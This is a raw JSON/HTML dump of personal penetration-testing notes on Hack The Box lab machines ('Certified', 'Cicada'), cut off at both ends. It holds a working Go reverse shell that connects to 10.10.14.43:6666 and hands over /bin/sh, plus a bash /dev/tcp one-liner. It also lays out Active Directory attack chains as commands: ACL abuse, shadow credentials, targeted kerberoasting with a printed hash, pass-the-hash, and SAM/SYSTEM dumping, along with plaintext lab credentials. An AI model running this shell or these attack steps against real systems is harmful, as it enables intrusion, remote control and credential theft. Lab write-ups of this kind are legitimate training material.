class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport \u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;net\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;os/exec\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;time\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efunc main\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        reverse\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;10.10.14.43:6666\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// bash -i \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e /dev/tcp/localhost/6666 0\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efunc reverse\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost string\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        c, err :\u003cspan class=\"o\"\u003e=\u003c/span\u003e net.Dial\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;tcp\u0026#34;\u003c/span\u003e, host\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e nil !\u003cspan class=\"o\"\u003e=\u003c/span\u003e err \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e nil !\u003cspan class=\"o\"\u003e=\u003c/span\u003e c \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        c.Close\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                time.Sleep\u003cspan class=\"o\"\u003e(\u003c/span\u003etime.Minute\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                reverse\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        cmd :\u003cspan class=\"o\"\u003e=\u003c/span\u003e exec.Command\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/bin/sh\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        cmd.Stdin, cmd.Stdout, cmd.Stderr \u003cspan class=\"o\"\u003e=\u003c/span\u003e c, c, c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        cmd.Run\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        c.Close\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        reverse\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Caption"},{"content":"#Shadow_credential Target : 10.10.11.41\nScan :\nPORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-24T16:20:06+00:00; +7h00m00s from scanner time. 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36\rInitial credential : judith.mader : judith09\nUsers found :\nManagement management_svc ca_operator alexander.huges harry.wilson gregory.cameron\rbloodhound-python -d \u0026#39;certified.htb\u0026#39; -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; -ns 10.10.11.41 -dc DC01.certified.htb -c all\rWrite Owner ACL : owneredit.py -action write -new-owner \u0026#39;judith.mader\u0026#39; -target \u0026#39;MANAGEMENT\u0026#39; \u0026#39;certified.htb\u0026#39;/\u0026#39;judith.mader\u0026#39;:\u0026#39;judith09\u0026#39;\rdacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal \u0026#39;judith.mader\u0026#39; -target-dn \u0026#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB\u0026#39; \u0026#39;certified.htb\u0026#39;/\u0026#39;judith.mader\u0026#39;:\u0026#39;judith09\u0026#39;\rnet rpc group addmem \u0026#34;MANAGEMENT\u0026#34; \u0026#34;judith.mader\u0026#34; -U \u0026#34;certified.htb\u0026#34;/\u0026#34;judith.mader\u0026#34;%\u0026#34;judith09\u0026#34; -S \u0026#34;DC01.certified.htb\u0026#34;\rGeneric write : python3 pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;list\u0026#34; python3 pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add\u0026#34; --filename key --export PEM\rNot working ... , My bad it works\n[Nov 24, 2024 - 11:13:08 (CET)] exegol-Kraken pywhisker # targetedKerberoast.py -v -d \u0026#39;certified.htb\u0026#39; -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (management_svc) $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$347d9440e08d552b9f7fd2c86c0d67b1$a75cf4ebbff8c627819e52b02ea06dc744b856b03b5b48b1b34ec6bb1bc811e76b30414328e78dd1d8e5f7ce8d16b655d73341ad31c9082352e00bac3db801d6d00a41db0043ac6e765d465d2e7212832877497db297683dd364d88f1a1beee2201a780608a231dea290ffe766581151c0e42720962fe7a04ca52b3a05094052c527600abb4ba78c41d3bbe012fc899edc6387899b04c4231a2d3e1f4239f4159508ce82b5cae73f4a3765341da181c2d704917e55960d0d230f634118ea749a8ecdfae6b1fe5476fad0b2be0c0e3f4c8e52079027224914c325e1e5dc08750239132373e8feafafe888b84ad3b70a081b89f64edea1afe36574ab3fec4dcf693bb9a6ee9626e29b9ce1c13a756dc4de44f8275ffff033de18d9c30399aea39c8609512995b768a045de1576c877a5371c2eb9d9d3f802b3167cb91277bafbf0e0ea963518b39ed1fd9480c24410f447af4a175e7727e67a593cb97612af3a18d9910d33876d536f5857ff69b7511294692f6cd3ef467136801bb2585ae80d01372d62c236052b1ca69badec1abe4d93cb744dd81d7d82edbad9c3038314a946c1c0afce9705ba822897689c091577bc70ee605409cd6ba5180a48e6f4eb954e1e4eb865b4b23bb9af3b1b955d6ce8f647cb636054f4fcf1989e3488a4eb41548820bcb626c17302a8c8311fb9ca7f688d5d58e0136c173327376b21094499bfe057b032d33a402becbc5247df02803b113ddece0e7d743a4aaa5e4d9b6d9b5a8a0a80db72c506400d88a237f4f943617be7070fd48a2896612bb319a0fedb8db404b66c09de0fa7f1ddccc82aced343a6910c0255c8c17366d88ff3cd0642a7f840271cccbdb8cdef253b17740dd1bec0672f1f6ba9be16e27c64e18bee537dbb19a39cabce1c1bd32c13ccbfdb9f074a2ca717b5b22f15589b03027a74500a743ca30d75318cf8b35352d9470083d389f0548b70ac65f7c2f9a549675c786e18cfae652548d82af2aed789feef1442e4f4c7df36505b4f89735544440212e49d34d7e9cb6c707c08a1c22cc7dc0dcf286ffa10d713a21d1b88611cc45f87691f082d86deeceecd5fe9c2f51c61dd6552c2651c404b4fd5afde44fa32e93ee4b3040b6fd5cf8cd96589cec5a0aad0403ff8af9403cea9fbdfd9c30bb3d1750fe3e05673504cb957cdd748b6174bca133c8f8d5b6189e8a0dab82aac132fba6ef54cc6382a9fdaa26ef94fdd73577cc3781453471cfc92fb486128d9e458da7ed2c1dd63f50257e0a3f3022598c455c03806fa77e9f288ae97c77c46aaee4db098cb9e0c430fc0fe2134f2a1e8cfc86d784298bd94d020c9adf95a849c66574ce2d84b8dfac246271223216ff9e8b12c42040811d899dd9f6cc8cac518197eedc4f00a25568189128bf789ab6d5fc4b4c508914088008a6da9b230c2e5fda03c9510e8f759f4f6f70d2b4073a2fc06e1d4b86e5756673e5a9077e9853a53faafb955b37c64f38c9b92a15076e233febd80a5d5364de8618466cd5c3779a19beb7f5b0cdfbf69c1174f19e8b6b22a5a8855a46c771d87d2fa835c8c1c1e9ea9007b3d\rCan't crack it Get a tgt with the certificate : gettgtpkinit.py -cert-pfx \u0026#34;ACpe7bSn.pfx\u0026#34; -pfx-pass \u0026#34;jm2eQRJ4KGuPQ11LUSu7\u0026#34; \u0026#34;certified.htb/management_svc\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; #or gettgtpkinit.py -cert-pem key_cert.pem -key-pem key_priv.pem certified.htb/management_svc management.ccache export KRB5CCNAME=management.ccache\rRecover the Nt hash : getnthash -key \u0026#34;725378f2fe6e5decc64e196fcd98ea97a20cebbe5d60e83806d6356c9be52178\u0026#34; certified.htb/management_svc a091c1832bcdd4677c28b5a6a1295584\rPass the hash : evil-winrm -u \u0026#34;management_svc\u0026#34; -H \u0026#34;a091c1832bcdd4677c28b5a6a1295584\u0026#34; -i \u0026#34;$t\u0026#34;\r","date":"2023-09-07","id":30,"permalink":"/notes/lab/htb/certified/","summary":"\u003cp\u003e#Shadow_credential\nTarget : 10.10.11.41\u003c/p\u003e\n\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC01.certified.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-05-13T15:49:36\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-05-13T15:49:36\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-11-24T16:20:06+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +7h00m00s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  http-rpc-epmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ldapssl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC01.certified.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-05-13T15:49:36\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-05-13T15:49:36\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  globalcatLDAP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  globalcatLDAPssl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC01.certified.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-05-13T15:49:36\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-05-13T15:49:36\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eInitial credential :\n\u003ccode\u003ejudith.mader : judith09\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"Certified"},{"content":"Scan :\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-29 17:23:42Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m58s | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2024-09-29T17:24:25 |_ start_date: N/A\rnetexec smb 10.129.21.236 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --rid-brute | grep \u0026#39;\\\\\u0026#39; | cut -d $\u0026#39;\\\\\u0026#39; -f2 | cut -d \u0026#39; \u0026#39; -f1 | tee -a users_rid.txt\rsmbclient.py cicada.htb/guest:\u0026#39;\u0026#39;@10.129.21.236\rwe find a note with a password : Cicada$M6Corpb*@Lp#nZp!8 cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8\rObtain user description netexec smb 10.129.21.236 -u \u0026#39;michael.wrightson\u0026#39; -p \u0026#39;Cicada$M6Corpb*@Lp#nZp!8\u0026#39; --users SMB 10.129.21.236 445 CICADA-DC david.orelious 2024-03-14 12:17:29 2 Just in case I forget my password is aRt$Lp#7t*VQ!3 cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3\rEnumerate : bloodhound-python -d \u0026#39;cicada.htb\u0026#39; -u \u0026#39;michael.wrightson\u0026#39; -p \u0026#39;Cicada$M6Corpb*@Lp#nZp!8\u0026#39; -ns 10.129.21.236 -dc CICADA-DC.cicada.htb -c all\rMore Share : smbclient.py cicada.htb/david.orelious:\u0026#39;aRt$Lp#7t*VQ!3\u0026#39;@10.129.21.236 $sourceDirectory = \u0026#34;C:\\smb\u0026#34; $destinationDirectory = \u0026#34;D:\\Backup\u0026#34; $username = \u0026#34;emily.oscars\u0026#34; $password = ConvertTo-SecureString \u0026#34;Q!3@Lp#M6b*7t*Vt\u0026#34; -AsPlainText -Force $credentials = New-Object System.Management.Automation.PSCredential($username, $password) $dateStamp = Get-Date -Format \u0026#34;yyyyMMdd_HHmmss\u0026#34; $backupFileName = \u0026#34;smb_backup_$dateStamp.zip\u0026#34; $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath Write-Host \u0026#34;Backup completed successfully. Backup file saved to: $backupFilePath\u0026#34;\revil-winrm -i 10.129.21.236 -u emily.oscars -p \u0026#39;Q!3@Lp#M6b*7t*Vt\u0026#39;\rPrivesc: reg save HKLM\\SYSTEM SYSTEM.SAV reg save HKLM\\SAM SAM.SAV secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL\r","date":"2023-09-07","id":31,"permalink":"/notes/lab/htb/cicada/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-09-29 17:23:42Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: cicada.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCICADA-DC.cicada.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-22T20:24:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-08-22T20:24:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: cicada.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCICADA-DC.cicada.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-22T20:24:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-08-22T20:24:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: cicada.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 